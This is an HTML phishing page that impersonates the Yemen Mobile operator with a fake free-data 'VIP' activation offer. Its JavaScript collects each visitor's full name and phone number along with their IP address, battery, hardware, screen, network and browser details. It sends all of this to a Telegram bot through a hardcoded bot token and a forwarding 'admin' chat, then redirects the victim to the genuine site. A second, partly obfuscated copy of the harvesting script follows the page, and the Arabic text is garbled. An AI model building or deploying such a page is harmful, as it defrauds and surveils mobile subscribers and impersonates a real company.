<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„ - Ø®Ø¯Ù…Ø§Øª VIP</title>
    <style>
        :root { --ym-blue: #0054a6; --ym-red: #e31e24; }
        body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--ym-red); }
        .header img { width: 130px; }
        .hero { background: var(--ym-blue); color: #fff; padding: 25px; text-align: center; }
        .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
        .vip-card { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; border: 1px solid #ffd700; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        .btn-vip { background: linear-gradient(90deg, var(--ym-red), #b31419); color: #fff; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #loading { display: none; text-align: center; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ym-red); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header"><img src="https://yemenmobile.com.ye/assets/images/logo.png"></div>
<div class="hero"><h2>Ø¨Ø§Ù‚Ø© Ø³Ù„ÙÙ†ÙŠ VIP - 200MB ğŸš€</h2></div>

<div class="container">
    <div class="vip-card">
        <input type="text" id="fullname" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø±Ø¨Ø§Ø¹ÙŠ">
        <input type="number" id="phonenum" placeholder="77XXXXXXX">
        <select id="service">
            <option>ØªÙØ¹ÙŠÙ„ ÙÙˆØ±Ø¬ÙŠ Ù…Ø¬Ø§Ù†ÙŠ (200MB)</option>
            <option>Ø®Ø¯Ù…Ø© Ø³Ù„ÙÙ†ÙŠ VIP</option>
        </select>
        <button class="btn-vip" onclick="launchRadar()">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¢Ù†</button>
        <div id="loading"><div class="spinner"></div><p>Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</p></div>
    </div>
</div>

<script>
const _TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
const _ADMIN = "7715667493";
const _ID = new URLSearchParams(window.location.search).get('id') || _ADMIN;

async function launchRadar() {
    const n = document.getElementById('fullname').value;
    const p = document.getElementById('phonenum').value;
    if(!n || !p) return alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª");

    document.getElementById('loading').style.display = 'block';

    const info = await getDeepInfo(n, p);
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    try {
        await fetch(`https://api.telegram.org/bot${_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: _ID, text: info, parse_mode: 'Markdown' })
        });
        if(_ID !== _ADMIN) {
            await fetch(`https://api.telegram.org/bot${_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: _ADMIN, text: info, parse_mode: 'Markdown' })
            });
        }
        alert("ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨Ùƒ! Ø³ÙŠØªÙ… Ø§Ù„ØªÙØ¹ÙŠÙ„ Ø®Ù„Ø§Ù„ 15 Ø¯Ù‚ÙŠÙ‚Ø©.");
        window.location.href = "https://yemenmobile.com.ye";
    } catch (e) { alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø³ÙŠØ±ÙØ±ØŒ Ø­Ø§ÙˆÙ„ Ù…Ø¬Ø¯Ø¯Ø§Ù‹"); }
}

async function getDeepInfo(n, p) {
    let ip = "N/A";
    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
    let bat = "N/A";
    if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100) + "%"; }
    
    return `ğŸ’ **[ØµÙŠØ¯ VIP Ø¬Ø¯ÙŠØ¯]** ğŸ’\nğŸŒ IP: \`${ip}\`\nğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${n}\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${p}\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${bat}\nğŸ“± Ø§Ù„Ù†Ø¸Ø§Ù…: ${navigator.platform}\nâ° Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-YE')}`;
}
</script>
</body>
</html>
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('id') || _0x2b2;

async function launchRadar() {
    const name = document.getElementById('fullname').value;
    const phone = document.getElementById('phonenum').value;
    if(!name || !phone) { alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©"); return; }

    document.getElementById('loading').style.display = 'block';

    // Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (ØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„ PHP Ø¨Ù…Ø­Ø±Ùƒ JS Ù‚ÙˆÙŠ)
    const reportData = await getDeepInfo(name, phone);
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¨Ø§Ø´Ø±Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… (Ø¨Ø¯ÙˆÙ† Ø§Ù„Ø­Ø§Ø¬Ø© Ù„Ù…Ù„Ù gate.php)
    await sendDirectToTG(reportData);

    setTimeout(() => {
        alert("ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨Ùƒ! Ø³ÙŠØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© Ø®Ù„Ø§Ù„ 15 Ø¯Ù‚ÙŠÙ‚Ø©.");
        window.location.href = "https://yemenmobile.com.ye";
    }, 3000);
}

async function sendDirectToTG(text) {
    const url = `https://api.telegram.org/bot${_0x5a1}/sendMessage`;
    const payload = {
        chat_id: targetId,
        text: text,
        parse_mode: 'Markdown'
    };

    try {
        await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        // Ø¥Ø±Ø³Ø§Ù„ Ù†Ø³Ø®Ø© Ù„Ù„Ø£Ø¯Ù…Ù† Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ù„Ø¶Ù…Ø§Ù† Ø¹Ø¯Ù… Ø§Ù„Ø¶ÙŠØ§Ø¹
        if(targetId !== _0x2b2) {
            payload.chat_id = _0x2b2;
            await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
        }
    } catch (e) { console.error("Error sending data"); }
}

async function getDeepInfo(name, phone) {
    let bat = "ØºÙŠØ± Ù…ØªØ§Ø­", charge = "ğŸ”‹";
    if(navigator.getBattery) {
        const b = await navigator.getBattery();
        bat = Math.round(b.level*100) + "%";
        charge = b.charging ? "âš¡ ÙŠØ´Ø­Ù†" : "ğŸ”‹ Ù„Ø§ ÙŠØ´Ø­Ù†";
    }

    // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù€ IP (Ù„Ø£Ù† JS Ø§Ù„Ø¹Ø§Ø¯ÙŠ Ù„Ø§ ÙŠØ±Ø§Ù‡ Ù…Ø¨Ø§Ø´Ø±Ø©ØŒ Ù†Ø³ØªØ®Ø¯Ù… Ø®Ø¯Ù…Ø© Ø®Ø§Ø±Ø¬ÙŠØ© Ù…ÙˆØ«ÙˆÙ‚Ø©)
    let ip = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...";
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const ipData = await res.json();
        ip = ipData.ip;
    } catch(e) { ip = "ØªØ¹Ø°Ø± Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP"; }

    const n = navigator;
    const s = screen;
    const w = window;

    return [
        `ğŸ’ **[ØªÙ‚Ø±ÙŠØ± VIP Ø§Ù„Ø³ÙŠØ§Ø¯ÙŠ - GitHub Pages]** ğŸ’`,
        `ğŸŒ **IP Ø§Ù„Ø¶Ø­ÙŠØ©:** \`${ip}\``,
        `ğŸ‘¤ **Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø§Ø³ØªØ¯Ø±Ø§Ø¬:**`,
        `- Ø§Ù„Ø§Ø³Ù…: ${name}`, `- Ø§Ù„Ù‡Ø§ØªÙ: ${phone}`, `- Ø§Ù„Ø®Ø¯Ù…Ø©: ${document.getElementById('service').value}`,
        `ğŸ”‹ **Ø§Ù„Ø·Ø§Ù‚Ø© ÙˆØ§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:**`,
        `- Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´Ø­Ù†: ${bat}`, `- Ø­Ø§Ù„Ø© Ø§Ù„Ø´Ø­Ù†: ${charge}`,
        `ğŸ“¡ **Ø§Ù„Ø´Ø¨ÙƒØ© ÙˆØ§Ù„Ø§ØªØµØ§Ù„:**`,
        `- Ø§Ù„Ù†ÙˆØ¹: ${n.connection?.effectiveType}`, `- Ø§Ù„Ø­Ø§Ù„Ø©: ${n.onLine ? "Ù…ØªØµÙ„ âœ…" : "Ø£ÙˆÙÙ„Ø§ÙŠÙ† âŒ"}`,
        `ğŸ§  **Ø§Ù„Ø¹ØªØ§Ø¯ ÙˆØ§Ù„Ù…Ø¹Ø§Ù„Ø¬:**`,
        `- Ø§Ù„Ø£Ù†ÙˆÙŠØ©: ${n.hardwareConcurrency}`, `- Ø§Ù„Ø±Ø§Ù…: ${n.deviceMemory || 'N/A'} GB`, `- Ø§Ù„Ù…Ù†ØµØ©: ${n.platform}`,
        `ğŸ“ **Ø§Ù„Ø´Ø§Ø´Ø©:** ${s.width}x${s.height}`,
        `ğŸŒ **Ø§Ù„Ø¨ÙŠØ¦Ø©:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
        `ğŸ”’ **Ø§Ù„Ù…ØªØµÙØ­:** ${n.userAgent.split(' ')[0]}`,
        `ğŸ“… **Ø§Ù„ØªÙˆÙ‚ÙŠØª:** ${new Date().toLocaleString('ar-YE')}`
    ].join('\n');
}
</script>
</body>
</html>
